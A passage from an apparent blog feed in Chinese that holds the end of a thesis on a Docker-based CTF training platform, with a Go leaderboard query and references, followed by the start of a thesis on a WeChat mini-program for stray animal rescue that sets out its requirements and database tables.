class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="4-3-3-题目管理模块的实现">4.3.3 题目管理模块的实现</h5><p>​题目管理功能，包括题目信息管理和题目上传，管理员通过设置Display ID作为题目的唯一标识符，设置题目类型，答案等信息，后端接收到前端传输的附件或者Dockerfile文件后会将其放在后端的对应位置，并将其根据Display ID进行更名。题目信息管理则与前面的用户信息管理内容相似。题目管理页面具体内容如图4-10所示。</p><p>​同时由于在Web和Pwn两种类型的题目中使用了Docker容器，管理员模块在题目管理下设一栏容器管理。在容器管理中会显示服务器中目前运行的Docker容器信息，包括容器的IP地址，所占空间，开启用户等。同时由于平台云服务器实际条件的限制，允许管理员可以在后台手动释放用户开启的容器。</p><img src="D:\blog\shierjinghuang\source\_posts\基于Docker容器的网络安全实验平台的设计与实现\wps27.jpg" style="zoom:80%;" /><center>图4-10 题目管理页面</center>#### 4.4 排行榜及积分实现<p>用户在提交正确的Flag后，用户会获得当前题目的分值，该分值由题目初始分值和题目通过次数与解题次数共同决定。后端会将题目当前的分值添加给用户。排行榜通过统计用户获得的分数对用户进行排名，并将系统内前十的用户成绩展示，排名模块如图4-11所示。</p><p><img src="D:%5Cblog%5Cshierjinghuang%5Csource_posts%5C%E5%9F%BA%E4%BA%8EDocker%E5%AE%B9%E5%99%A8%E7%9A%84%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C%E5%B9%B3%E5%8F%B0%E7%9A%84%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%AE%9E%E7%8E%B0%5Cwps28.jpg" alt="img"></p><p>图4-11 排行榜模块实现</p><p>关键代码如下：</p><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">func</span> InquireLeaderboard <span class="token punctuation">(</span>i <span class="token operator">*</span>gin<span class="token punctuation">.</span> Context<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  DB<span class="token punctuation">:</span> <span class="token operator">=</span> common<span class="token punctuation">.</span> GetDB <span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token keyword">var</span> UserList <span class="token punctuation">[</span><span class="token punctuation">]</span> ComputerUser  DB<span class="token punctuation">.</span> Select <span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token builtin">string</span><span class="token punctuation">&#123;</span><span class="token string">"nick_name"</span><span class="token punctuation">,</span><span class="token string">"number"</span><span class="token punctuation">,</span><span class="token string">"integral"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span> Limit <span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">.</span> Order <span class="token punctuation">(</span><span class="token string">"integral desc"</span><span class="token punctuation">)</span><span class="token punctuation">.</span> <span class="token function">Find</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>UserList<span class="token punctuation">)</span>  i<span class="token punctuation">.</span>JSON <span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span> gin<span class="token punctuation">.</span>H <span class="token punctuation">&#123;</span>  <span class="token string">"data"</span><span class="token punctuation">:</span> UserList<span class="token punctuation">,</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="4-5-题目搜集和整理">4.5 题目搜集和整理</h4><p>​由于CTF赛题涉及知识范围广泛，参与者通过这类竞赛能够接触到网络安全的各个领域，从而全面提升网络安全从业人员的技术水平和知识储备。对其中各种网络安全基础知识的掌握是解决相应CTF赛题的关键。这些知识包括了网络协议的原理、反编译技术、密码编码学、常见的渗透方式和加固策略等内容。通过解决与网络安全相关的CTF赛题，参与者可以更加深入地了解网络协议、加解密算法、漏洞利用技术等内容，从而在未来可能面临的网络安全维护中更加熟练地应对各种挑战。</p><p>​题库搜集过程中详细阅读了从0到1 CTFer成长之路，据此主要围绕附件型题目搜集，覆盖了附件型题目常见知识点，并根据难易程度进行了梯度划分，适合初学者提高网络安全能力。Web题目主要依据白帽子讲Web安全中介绍的常见Web渗透场景及漏洞，用户可以根据自身情况，在不同阶段选择适合自己的不同类型的题目，循序渐进，逐步提升自身能力^[12]^。</p><h3 id="5-总结">5 总结</h3><p>基于Docker容器的网络安全实验平台，在借鉴了现有网络安全实验平台的设计思路与实现方式的基础上，明确了系统的基本功能模块并进行总体设计，采用 Vue3+Element Plus+Go+MySQL 的架构。同时采用详细的设计保证系统的机密性、完整性与可用性，并设置预留扩展接口，保证平台的可拓展性。</p><p>在系统实现后，参考网络安全经典书籍与知识体系收集了大量CTF题目，目前题库中已经上传大量网络安全题目，包括历年各项赛事真题。本系统为网络安全初学者和高校中参加CTF竞赛的学生提供一个在线练习平台。涵盖了Web、Reverse、Misc、Crypto、Pwn等多种类型，涉及知识全面。</p><p>同时基于Docker容器的网络安全实验平台尚有些许不足，平台着重于CTF类型的题目，对于新兴的AWD以及AWD plus等比赛形式涉及较少，可考虑后期扩充。</p><h3 id="参考文献">参考文献</h3><p>[1] 吴世忠．2024年网络与信息安全风险前瞻[J]．中国信息安全，2023(12)：14-18．</p><p>[2] 李伦，王曦，郝志宇．美国网络空间靶场建设情况综述[J]．保密科学技术，2021(06)：53-60．</p><p>[3] 赵静，汤荣秀．网络攻防竞赛平台搭建[J]．无线互联科技，2023，20(17)：160-162．</p><p>[4] 玄世昌，王巍，苘大鹏等．基于虚拟靶场的渗透测试实践教学机制探索[J]．高教学刊，2024，10(02)：29-32．</p><p>[5] 宋晓锋，倪林，韩鹍等．CTF竞赛融入网络安全人才培养过程的探索与实践[J]．计算机教育，2021(11)：1-5．</p><p>[6] 梁建辉，侯昱辉，刘润福等．基于Docker的网络安全靶场设计与实现[J]．铁路计算机应用，2022，31(11)：67-70．</p><p>[7] 刘京菊，王永杰．面向人才培养的网络靶场体系与分类研究[J]．保密科学技术，2021(06)：18-23．</p><p>[8] 王海涛，宋丽华．浅析网络靶场的概念、分类与体系架构[J]．保密科学技术，2021(06)：4-9．</p><p>[9] 刘莉，刘持标，尤垂桔等．结合CTF竞赛的网络安全课程教学改革[J]．计算机教育，2019(04)：107-111．</p><p>[10] 闫梅．基于Docker容器化的Web渗透测试平台实现与应用[J]．信息记录材料，2021，22(09)：138-140.</p><p>[11] GB/T 42446-2023，信息安全技术 网络安全从业人员能力基本要求[S]．</p><p>[12] 王济昂，朱雨晨，马越等．基于Docker容器化部署的CTF线上靶场系统[J]．电子技术与软件工程，2021,(07)：210-212．</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;基于docker容器的网络安全实验平台的设计与实现&quot;&gt;基于Docker容器的网络安全实验平台的设计与实现&lt;/h3&gt;
&lt;p&gt;摘要：CTF(Capture The Flag)是常见的网络安全竞赛形式，赛事靶场部署了诸如Reverse、Misc、Crypto等附件类考题</summary>
      
    
    
    
    <category term="项目设计" scheme="https://shierjinghuang.github.io/categories/%E9%A1%B9%E7%9B%AE%E8%AE%BE%E8%AE%A1/"/>
    
    
    <category term="毕业论文" scheme="https://shierjinghuang.github.io/tags/%E6%AF%95%E4%B8%9A%E8%AE%BA%E6%96%87/"/>
    
    <category term="Vue" scheme="https://shierjinghuang.github.io/tags/Vue/"/>
    
    <category term="Go" scheme="https://shierjinghuang.github.io/tags/Go/"/>
    
    <category term="Docker" scheme="https://shierjinghuang.github.io/tags/Docker/"/>
    
  </entry>
  
  <entry>
    <title>基于微信小程序的流浪动物救助系统的设计与实现</title>
    <link href="https://shierjinghuang.github.io/2025/02/12/%E5%9F%BA%E4%BA%8E%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E7%9A%84%E6%B5%81%E6%B5%AA%E5%8A%A8%E7%89%A9%E6%95%91%E5%8A%A9%E7%B3%BB%E7%BB%9F%E7%9A%84%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%AE%9E%E7%8E%B0/"/>
    <id>https://shierjinghuang.github.io/2025/02/12/%E5%9F%BA%E4%BA%8E%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E7%9A%84%E6%B5%81%E6%B5%AA%E5%8A%A8%E7%89%A9%E6%95%91%E5%8A%A9%E7%B3%BB%E7%BB%9F%E7%9A%84%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%AE%9E%E7%8E%B0/</id>
    <published>2025-02-12T04:17:03.000Z</published>
    <updated>2025-04-02T07:13:56.312Z</updated>
    
    <content type="html"><![CDATA[<h2 id="基于微信小程序的流浪动物救助系统的设计与实现">基于微信小程序的流浪动物救助系统的设计与实现</h2><p><strong>摘要</strong>：随着人们生活水平的提高，人们对于精神层面的要求也日益提高。动物作为人类的陪伴对象，逐渐成为人们精神寄托的重要来源之一。宠物行业迅速发展，但随之而来是宠物被遗弃与宠物丢失。大量动物流浪在街头巷尾，生存环境恶劣，生存状况堪忧，城市环境、卫生和安全也面临巨大压力。在此基础上，采用TypeScript语言，基于Spring Boot框架，数据库使用MySQL，借助<a href="https://so.csdn.net/so/search?q=HBuilder&amp;spm=1001.2101.3001.7020">HBuilder</a> X配置微信开发者工具，实现基于微信小程序的流浪动物救助系统。系统管理员拥有用户信息管理、动物信息管理、寻宠与招领管理等功能。系统用户则有发布寻宠招领动态、申请领养动物等功能。微信小程序不仅是一个便捷的平台，让用户可以方便地参救助工作，还是一个管理流浪动物信息的工具，促进流浪动物救助事业的发展。</p><p><strong>关键词</strong>：动物救助系统 Spring Boot MySQL</p><h3 id="引言">引言</h3><p>流浪动物的救助问题长期以来都是社会关注的焦点之一，它们面临着生存、医疗和安全等多方面困境。为了更好地解决问题，救助流浪动物，使用科技手段介入研究流浪动物救助问题成为一种新的方法。微信小程序作为一种便捷的移动应用程序形式^[1]^，为流浪动物救助系统的设计与实现提供了新的可能性。研究内容主要涉及流浪动物信息管理、流浪动物救助、领养流程优化、用户交互设计等方面，系统将分为前端小程序界面、后台管理界面和后端数据库管理，通过需求分析、设计系统、开发实现等阶段，不断完善改进系统。前端微信小程序界面，包括动物信息发布、动物信息展示、寻宠与领养、资讯阅读等功能。后台管理界面，包括动物信息管理、用户信息管理、资讯管理等功能。后端通过Navicat和MySQL协同使用，实现对数据库的高效操作。具体实现通过使用Spring Boot、Vue3、uniapp、TypeScript等技术开发出小程序与前后端分离的功能完善、界面友好的流浪动物救助系统小程序，提高流浪动物救助工作的便捷性和效率。通过设计实现流浪动物救助系统，为流浪动物救助工作提供一个简洁高效的信息传播与动物救助的平台，提高公众对流浪动物救助的关注度，推动流浪动物救助保护事业的发展，促进人与动物和谐相处。</p><h3 id="1-研究背景-目的与意义">1 研究背景、目的与意义</h3><h4 id="1-1-研究背景">1.1 研究背景</h4><p>在生活中，留守老人、空巢青年等群体^[2]^，往往会将宠物视为家庭的一部分，赋予它们陪伴自己生活的重要角色，并从中获取情感上的满足和乐趣。据相关资料显示，未来5年内，中国宠物猫狗的数量将会持续增加，从2023年的1.9亿只增至2.1亿只，宠物行业规模也将进一步扩大。同时，随着科技的进步和社交媒体的兴起，“云养宠”这一新兴的概念逐渐成为宠物行业的发展趋势，为宠物行业的未来展现出了广阔的前景。</p><p>然而，宠物饲养的增加也伴随着宠物被遗弃与宠物丢失现象的增多。《2021年中国宠物行业白皮书》指出，2021年流浪猫的数量高达5300万只，流浪狗的数量高达4000万只，流浪猫狗的总量近1亿^[3]^。同时《2023年-2024中国宠物行业白皮书》也表明，宠物猫狗的数量仍在增长，这意味着，流浪猫狗的数量也在不断增长。由此可见，整体流浪动物的数量庞大。据不完全统计，国内流浪动物数量每年新增约六千万，整体流浪动物的数量接近六亿^[4]^，可见现阶段我国流浪动物现状并不乐观，由于动物遗弃、妨害动物福利等行为缺乏相应的法律约束，救助组织缺少有效合作和协调，加上管理不善等原因，流浪动物问题一直未能得到有效控制和解决^[1]^。</p><p>随着科技的发展，互联网时代的到来无疑给流浪动物问题的解答提供了新的研究方向，它在信息传播、影响力等方面具有得天独厚的优势，利用移动应用帮助解决流浪动物救助问题，通过新媒体技术帮助流浪动物这一特殊的弱势群体，设计简洁高效的救助方案、寻宠与领养流程，将动物的生命福利放在首位，提高对流浪动物的救助质量，呼吁更多人了解并参与到流浪动物救助中，对解决现存的流浪动物救助问题有着十分重要的意义^[1]^。</p><h4 id="1-2-研究目的">1.2 研究目的</h4><p>流浪动物救助系统的研究目的不仅局限于简单的救助行动，而是致力于构建一个全面、高效、人性化的救助体系。这一体系旨在通过一系列精心设计的策略和措施，从根本上改善流浪动物的生活状况，同时唤起社会对这一群体的广泛关注。流浪动物救助系统研究的首要目标是提高救助效率。通过优化救助流程、引入先进的科技手段，促进救助行动更加迅速、准确和有效。这不仅能提高救助的成功率，还能最大程度地减少救助过程中的风险和不确定性。具体研究目的总结如下。</p><ol><li><p>整合资源，数字化管理动物信息</p><ul><li>构建一个协同合作的流浪动物救助系统，对流浪动物救助工作进行数据化管理和分析，为相关决策提供数据依据。</li></ul></li><li><p>推动和支持流浪动物救助事业发展</p><ul><li>通过研究和实践，为流浪动物保护事业提供多样化思路，配合与支持相关政府部门、机构和社会组织加大对流浪动物救助工作。</li></ul></li><li><p>互联网+公益模式构建流浪动物救助系统^[5]^</p><ul><li>通过互联网技术，充分发挥其信息传播优势，扩大覆盖范围，提高大众与参与度，利用便捷的移动应用小程序，促进科技在公益领域的应用，提高流浪救助效率。</li></ul></li></ol><h4 id="1-3-研究意义">1.3 研究意义</h4><p>流浪动物救助系统的研究意义，不仅仅在于维护流浪动物的基本生存福利和提升公众对动物的爱护与救助意识，更在于减少疾病传播风险、维护生态平衡和生物多样性、提高社会道德和伦理水平以及为其他社会问题提供借鉴和启示。通过深入研究和持续实践，不断完善和发展这一系统，为流浪动物和人类社会的共同福祉做出更大的贡献。同时，通过全社会的共同努力和参与，形成一个更加文明、和谐和进步的社会。具体意义总结如下。</p><ol><li><p>保护动物的生存权利与福利</p><p>通过流浪动物救助系统的设计与实现，努力维护他们无饥渴之忧的生理福利、有适当住所的环境福利、减少疾病的卫生福利、表达本性的行为福利以及降低恐惧及焦虑心情的心理福利，减少它们受到的伤害和虐待，提高它们生存的希望^[5]^。</p></li><li><p>提高公众意识，促进社会和谐</p><p>通过关注和救助流浪动物，可以促进社会的和谐与稳定，增强社会成员的责任感和共情能力，推动社会对动物权益的重视和保护，培养民众关爱生命、救助生命的意识，促进人与动物之间的和谐共生^[6]^，从而维护整个生态系统的健康与稳定。</p></li><li><p>推动科技与公益结合，提高救助效率</p><p>救助工作者可以通过小程序系统管理救助流程、信息发布等工作，提高工作效率。将新时代科技与公益救助事业相结合，提高流浪动物救助工作的效率和水平，探索解决流浪动物救助问题的新模式。这有助于推动相关公益救助的发展和创新，为动物保护和福利事业贡献力量。</p></li></ol><h3 id="2-环境与技术介绍">2 环境与技术介绍</h3><h4 id="2-1-开发环境">2.1 开发环境</h4><p>IDEA全称IntelliJ IDEA，是用于java语言开发的集成环境，也可用于其他语言，在业界被公认为最好的java开发工具之一^[7]^。IDEA具有强大的整合能力，支持主要流行的技术与框架，有快速、便捷的提示功能以及代码模板，便于系统设计人员快速高效的实现项目开发。</p><h4 id="2-2-navicat与mysql">2.2 Navicat与MySQL</h4><p>Navicat是功能丰富的数据库管理与开发工具，一个软件Navicat就可以打开MySQL、Redis等，不需要打开很多个图形化管理工具。用户界面友好直观，能够轻松简单的操作多种主流数据库。同时，Navicat支持数据同步和迁移，提供可视化数据库架构工具，帮助用户更直观地理解和操作数据库。</p><p>MySQL是一款开源的关系型数据库)管理系统，以其便捷易用的特性广受用户青睐，并且能够根据用户需求进行修改和定制；跨平台支持多个操作系统，具有很强的灵活性；高性能，能够快速处理大量数据和高并发请求；具备良好的可扩展性；支持分布式数据库架构，能够满足不同环境下的使用要求。</p><p>Navicat与MySQL协同使用，帮助用户更好地管理和操作MySQL数据库。通过Navicat，能够提高与MySQL等数据库进行交互的高效性和简洁性，更好地满足多种需求，提高项目开发的效率与质量。</p><h4 id="2-3-typescript编程语言">2.3 TypeScript编程语言</h4><p>[TypeScript是JavaScript的一个超集，是由微软开发的自由和开源的编程语言。TypeScript可以编译成纯JavaScript，并将生成的JavaScript结果运行在任意浏览器、任意计算机和任意操作系统上。TypeScript不仅增加了代码的可读性和可维护性，同时保持了代码的简洁与灵活，给使用者带来极大便利。</p><h4 id="2-4-spring-boot框架">2.4 Spring Boot框架</h4><p>Spring Boot是由Pivotal团队提供的全新的轻量级框架，其设计目的是用来简化Spring应用的创建、运行、调试、部署等[8]。Spring Boot也被称为微框架，可以简化Maven配置，没有代码生成、可以不用XML配置，轻松创建基于生产级别的、独立的应用程序。</p><h3 id="3-需求分析">3 需求分析</h3><h4 id="3-1-功能性需求分析">3.1 功能性需求分析</h4><p>功能性需求分析是开发系统的一个必要前提，通过功能性需求分析帮助系统设计人员更好的了解用户的实际需求情况，更好地解决流浪动物救助问题，同时这也是系统开发的原因。基于现实因素考虑，通过流浪动物救助系统小程序的基本功能是实现对流浪动物信息的管理及其救助，满足用户的实际需求。管理员的主要功能是实现对流浪动物救助相关事务的整体管理，具体管理流浪动物信息、用户信息、轮播图信息、资讯与反馈信息等。用户的主要功能是实现对流浪动物的救助与相关信息的宣传。</p><p>经过对用户的实际需求分析，流浪救助系统的设计分为两大模块：管理员模块和用户模块。为了提高系统的安全性、管理的简洁性和用户信息的保密性，为管理员和用户设置不同的登录与使用权限，拥有不同的系统管理功能、使用功能。</p><p>管理员功能模块：管理员登录系统时，必须核验账户、密码与验证码。检测通过后，才可以成功进入系统的管理后台，查看并管理相关用户信息和流浪动物信息。管理员可以对相关信息进行审核、编辑与删除；可以进行资讯管理、公告管理与反馈信息管理；管理员拥有权限修改和设置用户账户密码的功能；同时，设有超级管理员拥有管理员所有权限与功能，同时能够限制管理员的权限与功能。</p><p>用户功能模块：新用户登录小程序前，先正确填写注册账户信息，信息成功录入数据库后，用户能够成功登录进入小程序；已注册用户登录验证通过后，成功进入小程序，通过个人中心可以查看修改其个人信息与密码；可以发布、查看、收藏寻宠与招领信息；可以阅读学习最新资讯；同时，设有反馈功能，用户可以反馈遇到的问题，提出改进建议，便于系统的完善升级，提升用户使用体验。</p><h4 id="3-2-非功能性需求分析">3.2 非功能性需求分析</h4><p>系统的设计与实现不仅要满足基础的功能性需求，非功能性需求的实现也要格外重视。非功能性需求是为了满足系统用户的基础需求而必须具有，而且是除了功能性需求以外的重要特性，这些特性影响着系统能否持续稳定、安全、高效地提供服务。</p><p>可靠性是流浪动物救助系统的一个重要属性。在救助工作中，系统的可靠性对于保障动物的安全和救助工作的顺利开展至关重要。因此，系统需要具有一定的稳定性和容错能力，遇到突发异常情况是时也能及时识别问题并做出反馈，维护系统的持续可用性。</p><p>在可维护性方面，为了持续满足用户需求，系统需要不断的迭代与维护。因此，在设计过程中有必要对系统进行清晰的设计，使系统架构完整，便于后续调整。</p><p>此外，可扩展性也是流浪动物救助系统必须考虑的因素之一。随着救助工作的不断发展、完善与用户使用数量的增长，系统需要具备强大的可扩展能力，以应对不断增加的用户数量和数据规模。</p><p>安全性是流浪动物救助系统中不可忽视的一个重要方面。系统必须确保用户信息的安全，防止数据泄露和非法访问。通过设置合理的权限分配和身份认证机制，可以确保不同用户角色使用系统时，权限能得到有效控制。同时，系统还可以采用加密技术等安全措施，保护用户信息和数据的安全性。</p><p>最后，易用性也是流浪动物救助系统需要考虑的重要因素。系统应该具备简洁一致的交互界面和清晰便捷的操作流程，使用户能够轻松入门并完成所需的操作。</p><p>总之，流浪动物救助系统的非功能性需求分析需要综合考虑其性能、可靠性、可维护性、可扩展性、安全性和易用性等多个方面。通过合理的设计和优化，努力打造出一个持久高效、稳定、安全的救助系统，为流浪动物的救助工作提供有力支持。</p><h3 id="4-系统设计">4 系统设计</h3><h4 id="4-1-总体设计">4.1 总体设计</h4><p>在系统的总体设计中, 采用比较可靠的三层架构体系结构。使用三层架构体系结构不仅结构清晰、耦合度低，而且容易移植和维护，利于开发任务同步进行, 适应需求变化[7]。</p><p>系统设计与实现整体上分为两大模块：管理员模块和用户模块。管理员有权限修改和设置用户账户密码与状态、管理动物信息、管理资讯、公告与反馈。用户可以在小程序中访问修改其个人信息与密码、完成动物信息发布与救助、阅读学习最新资讯、反馈问题，提出改进建议。具体模块功能图如图4-1所示。</p><p><img src="D:%5Cblog%5Cshierjinghuang%5Csource_posts%5C%E5%9F%BA%E4%BA%8E%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E7%9A%84%E6%B5%81%E6%B5%AA%E5%8A%A8%E7%89%A9%E6%95%91%E5%8A%A9%E7%B3%BB%E7%BB%9F%E7%9A%84%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%AE%9E%E7%8E%B0%5Cwps37.png" alt=""></p><center>图4-1 具体功能模块图</center>#### 4.2 详细设计<p>系统设计与实现的目的是为了提高流浪动物救助效率，通过借助微信小程序简化救助流程，提高信息传播效率，提高用户使用便捷性。因此在设计时主要考虑实现后台管理员功能和小程序用户功能。二者身份不同，功能使用权限也不同。</p><h5 id="4-2-1-管理员功能">4.2.1 管理员功能</h5><ol><li>管理员管理：通过分配菜单与按钮限制管理员拥有的权限，能够完成编辑、增加、删除管理员信息，重置管理员登录密码的操作。</li><li>用户管理：通过状态按钮决定用户是否正常，可以管理、删除用户信息，重置用户登录密码。</li><li>菜单管理：通过录入、编辑菜单及按钮，增加、减少管理员可分配权限。</li><li>动物分类：新增、编辑与删除动物类别，便于用户选择动物类别。</li><li>寻宠管理：审核用户寻宠信息是否合规，可以选择发布、热推，不合规可以撤销或删除。</li><li>招领管理：审核用户招领信息是否合规，可以选择发布、热推，不合规可以撤销或删除。</li><li>轮播图管理：选择用户已发布的寻宠或招领信息，进行轮播展示。</li><li>反馈管理：接收用户的问题反馈与建议，进行系统优化。</li><li>资讯管理：发布流浪动物救助相关事件与政策，宣传流浪救助公益活动，提高用户爱护动物的意识。</li></ol><h5 id="4-2-2-用户功能">4.2.2 用户功能</h5><ol><li>个人信息：用户进入个人中心后点击个人信息模块，可以查看相关信息，根据需求更改个人信息以及账号密码</li><li>发布功能：发布寻宠以及招领信息</li><li>收藏功能：浏览动物信息时，可以点击收藏，在个人中心即可找到收藏内容，方便查看。</li><li>阅读资讯功能：帮助用户了解动物救助相关事件与政策，提高用户对动物的保护意识。</li><li>反馈功能：用户可以反馈遇到的问题，提出改进建议。</li></ol><h5 id="4-2-3-数据库设计">4.2.3 数据库设计</h5><p>系统的实现离不开数据库的设计，通过实际需求分析，用户拥有基础信息属性外，还可以领养、发布与收藏不同类别的流浪动物信息；管理员拥有基础属性外，还可以进行用户、动物、轮播图、资讯、公告、反馈等信息的管理。因此，在Navicat中创建了10个相关数据库表来存储系统数据信息。该系统的数据库中最主要的四个表为：动物详情表animal、分类详情表animal_category、用户详情表wx_user、收藏与收养详情表animal_collect_adopt。根据用户使用不同功能，系统会调用不同数据库表来满足用户操作。流浪动物救助系统的数据库中E-R实体关系如图4-2所示。</p><img src="D:\blog\shierjinghuang\source\_posts\基于微信小程序的流浪动物救助系统的设计与实现\wps4.png" style="zoom:50%;" /><center>图4-2 数据库E-R图</center>**1.动物详情表animal**<p>动物详情表animal存放流浪动物相关信息，用户可以发布流浪动物信息，通过管理员审核后可以在小程序进行展示，可供用户完成浏览、搜索、寻找、领养等操作。该表主要包括了动物编号、动物类别编号、发布类别、动物名称、动物年龄、动物照片等信息。其中动物编号animal_id为本表主键。详情如表4-1所示。</p><center>表4-1 动物详情表</center>| 字段名称    | 数据类型   | 说明                      || ----------- | ---------- | ------------------------- || animal_id   | int        | 动物编号                  || find_status | varchar    | 状态 0：未完成，1：已完成 || name        | varchar    | 动物名称                  || image       | text       | 动物图片                  || introduce   | mediumtext | 动物介绍                  || user_id     | int        | 发布用户编号              || category_id | int        | 分类编号                  |<p><strong>分类详情表animal_category</strong></p><p>分类详情表animal_category存放动物类别信息，通过设置不同动物类别，便于用户按类型发布、寻找、领养相关动物，提高操作的便捷性，节约时间，带给用户高效的体验。该表主要包括了动物类别编号、动物类别名称、分类序号等信息。其中动物类别编号category_id为本表主键。详情如表4-2所示。</p><center>表4-2 分类详情表</center>| 字段名称      | 数据类型 | 说明     || ------------- | -------- | -------- || category_id   | int      | 分类编号 || category_name | varchar  | 分类名   |<p><strong>用户详情表wx_user</strong></p><p>用户详情表wx_user存放小程序用户信息，记录用户基础信息，完成对用户账户信息是否正常的监管。该表主要包括了用户编号、用户昵称、用户姓名、用户头像、用户电话、登录账户、登录密码、账户状态等信息。其中user_id为本表主键。详情如表4-3所示。</p><center>表4-3 用户详情表</center>| 字段名称  | 数据类型 | 说明                     || --------- | -------- | ------------------------ || user_id   | int      | 用户编号                 || nick_name | varchar  | 用户昵称                 || picture   | varchar  | 用户头像                 || phone     | varchar  | 用户电话                 || username  | varchar  | 登录账户                 || password  | varchar  | 登录密码                 || status    | varchar  | 账户状态0：启用，1：停用 |<p><strong>收藏与收养详情表animal_collect_adopt</strong></p><p>收藏与收养详情表animal_collect_adopt存放用户收藏、收养的动物信息，主要包括了收藏与收养的动物序号、用户编号、收藏与收养的动物编号等信息。其中collect_id为本表主键。详情如表4-4所示。</p><center>表4-4 收藏与收养详情表</center>| 字段名称     | 数据类型 | 说明                 || ------------ | -------- | -------------------- || collect_id   | int      | 收藏/收养序号        || user_id      | int      | 用户编号             || animal_id    | int      | 动物编号             || colletc_time | datetime | 收藏/收养时间        || type         | varchar  | 类型0：收藏，1：收养 |<p>为了方便系统实现前后台管理，在数据库中分别创建了管理员详情表sys_user、菜单权限详情表sys_menu、轮播图详情表sys_banner、关联管理员与菜单详情表user_menu、资讯详情表news、反馈详情表suggestion。通过这六个表帮助完善系统功能，使管理员提高管理效率，提升用户的使用体验。</p><p><strong>管理员详情表sys_user</strong></p><p>管理员详情表sys_user存放管理员信息，记录管理员基础信息，实现对管理员账户状态的监管。该表主要包括了管理员编号、管理员昵称、管理员性别、管理员电话、登录账户、登录密码、账户状态、是否为超级管理员等信息。其中管理员编号user_id为本表主键。详情如表4-5所示。</p><center>表4-5 管理员详情表</center>| 字段名称  | 数据类型 | 说明                     || --------- | -------- | ------------------------ || user_id   | int      | 管理员编号               || nick_name | varchar  | 管理员昵称               || sex       | varchar  | 管理员性别               || phone     | varchar  | 管理员电话               || username  | varchar  | 登录账户                 || password  | varchar  | 登录密码                 || status    | varchar  | 账户状态0：启用，1：停用 || is_admin  | varchar  | 超级管理员0：否，1：是   |<p><strong>菜单权限详情表sys_menu</strong></p><p>菜单详情表sys_menu存放所有菜单与按钮的权限信息，便于分配给管理员，各管理员权限不同，协同完成对系统的管理，提高系统的安全性。该表主要包括了菜单编号、上级菜单编号、菜单名称、权限字段、图标、显示序号、上级菜单名称、类型、路由等信息。其中menu_id为本表主键。详情如表4-6所示。</p><center>表4-6 菜单权限详情表</center>| 字段名称    | 数据类型 | 说明                   || ----------- | -------- | ---------------------- || menu_id     | int      | 菜单编号               || parent_id   | int      | 上级菜单编号           || title       | varchar  | 菜单名称               || code        | varchar  | 权限字段               || icon        | varchar  | 图标                   || order_num   | int      | 显示序号               || parent_name | varchar  | 上级菜单名称           || type        | varchar  | 权限类型1：菜单2：按钮 || path        | varchar  | 路由                   || create_time | datetime | 创建时间               |<p><strong>轮播图详情表sys_banner</strong></p><p>轮播图详情表sys_banner存放轮播图信息，管理员筛选上传紧急重要的流浪动物信息或宣传信息，通过轮播图将其展示在小程序首页，用户进入小程序即可关注到紧急重要信息，无形中提高流浪动物救助宣传力度。该表主要包括了轮播图编号、动物编号、标题、图片、轮播序号、发布状态等信息。其中轮播图编号ban_id为本表主键。详情如表4-7所示。</p><center>表4-7 轮播图详情表</center>| 字段名称  | 数据类型 | 说明                     || --------- | -------- | ------------------------ || ban_id    | int      | 轮播图编号               || animal_id | int      | 动物编号                 || title     | varchar  | 标题                     || image     | varchar  | 图片                     || order_num | int      | 轮播序号                 || status    | varchar  | 发布状态0：发布，1：撤销 |<p><strong>关联管理员与菜单详情表user_menu</strong></p><p>关联管理员与菜单详情表user_menu存放管理员权限信息，清晰地展示管理员已经拥有的管理权限。该表主要包括了关联编号、管理员编号、菜单编号等信息。其中关联编号user_menu_id为本表主键。详情如表4-8所示。</p><center>表4-8 关联管理员与菜单详情表</center>| 字段名称     | 数据类型 | 说明       || ------------ | -------- | ---------- || user_menu_id | int      | 关联编号   || user_id      | int      | 管理员编号 || menu_id      | int      | 菜单编号   |<p><strong>资讯详情表news</strong></p><p>资讯详情表news存放资讯信息，管理员筛选流浪动物救助相关政策以及重大事件进行上传至资讯管理页面，用户通过资讯阅读了解最新资讯，提高流浪动物救助意识。该表主要包括了资讯编号、标题、图片、内容、创建时间等信息。其中资讯编号news_id为本表主键。详情如表4-9所示。</p><center>表4-9 资讯详情表</center>| 字段名称    | 数据类型   | 说明     || ----------- | ---------- | -------- || news_id     | int        | 资讯编号 || title       | varchar    | 标题     || image       | varchar    | 图片     || content     | mediumtext | 内容     || create_time | datetime   | 创建时间 |<p><strong>反馈详情表suggestion</strong></p><p>反馈详情表suggestion存放用户反馈信息，用户使用小程序过程中，可以反馈使用体会、遇到的问题，提出改进建议，帮助完善系统。该表主要包括了反馈编号、用户编号、内容、创建时间等信息。其中反馈编号id为本表主键。详情如表4-10所示。</p><center>表4-10 反馈详情表</center>| 字段名称    | 数据类型 | 说明     || ----------- | -------- | -------- || id          | int      | 